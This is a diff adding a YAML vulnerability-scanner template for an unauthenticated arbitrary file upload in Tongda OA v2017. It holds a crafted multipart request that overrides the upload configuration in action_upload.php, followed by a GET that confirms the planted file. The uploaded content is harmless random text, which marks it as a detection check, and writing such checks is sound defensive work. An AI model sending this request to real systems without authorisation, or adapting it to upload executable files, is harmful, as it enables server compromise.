@@ -1,0 +1,50 @@
+name: tongda-v2017-uploadfile
+set:
+  rand1: randomLowercase(12)
+  fileContent: randomLowercase(12)
+rules:
+  - method: POST
+    path: /module/ueditor/php/action_upload.php?action=uploadfile
+    headers:
+      Content-Type: multipart/form-data; boundary=55719851240137822763221368724
+    body: |
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+      ffff
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+      1000000000
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+      tcmd
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+      .txt
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="ffff"; filename="{{rand1}}.txt"
+      Content-Type: application/octet-stream
+
+      {{fileContent}}
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="mufile"
+
+      submit
+      -----------------------------55719851240137822763221368724--
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /{{rand1}}.txt
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(fileContent))
+detail:
+  author: zan8in
+  description: |
+    通达OA v2017 action_upload.php 任意文件上传漏洞
+    通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
+    app="TDXK-通达OA"
+  links:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
